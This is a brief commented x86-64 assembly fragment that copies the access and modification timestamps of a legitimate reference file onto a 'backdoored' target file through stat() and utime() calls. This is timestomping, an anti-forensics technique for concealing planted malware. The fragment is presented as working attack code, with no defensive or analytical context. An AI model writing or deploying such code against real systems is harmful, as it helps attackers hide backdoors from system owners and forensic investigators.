; --- 1. Read the legitimate file's timestamps ---
lea     rsi, [rsp+10h]     ; Load address of 'ref_stat' struct into rsi (Arg 2)
mov     rdi, r12           ; Assume r12 holds the 'reference_file' string pointer (Arg 1)
call    _stat              ; Call stat(reference_file, &ref_stat)

; --- 2. Extract and copy the times ---
; (In x86-64 Linux, st_atime is typically at offset 0x48, st_mtime at 0x58)
mov     rax, [rsp+58h]     ; Extract st_atime from the ref_stat struct
mov     [rsp], rax         ; Store it into new_times.actime

mov     rax, [rsp+68h]     ; Extract st_mtime from the ref_stat struct
mov     [rsp+8h], rax      ; Store it into new_times.modtime

; --- 3. Stomp the backdoored file ---
lea     rsi, [rsp]         ; Load address of the 'new_times' struct into rsi (Arg 2)
mov     rdi, r13           ; Assume r13 holds the 'target_file' string pointer (Arg 1)
call    _utime             ; Call utime(target_file, &new_times)
